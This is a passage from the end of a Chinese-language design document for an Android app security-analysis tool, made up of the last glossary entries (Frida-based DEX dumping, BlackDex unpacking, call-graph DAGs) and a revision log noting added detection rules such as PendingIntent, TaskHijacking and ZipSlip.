| frida-dexdump | - | 基于 Frida 的内存 DEX dump 工具 |
| BlackDex | - | 免 Root 脱壳工具（Android 10+） |
| DAG | Directed Acyclic Graph | 有向无环图（调用链可视化） |

---

## 修订记录

| 版本 | 日期 | 修订内容 |
|------|------|---------|
| V1.0 | 2025-01-10 | 初始方案 |
| V2.0 | 2025-01-15 | 增加：差异化定位与商业模式、加固混淆对抗、证据图模型工程化、性能与扩展性、法律合规边界、完整报告样例、术语对照表、实施时间人力估算、严重度×真实性双维矩阵、规则扩展（PendingIntent/TaskHijacking/ZipSlip 等） |
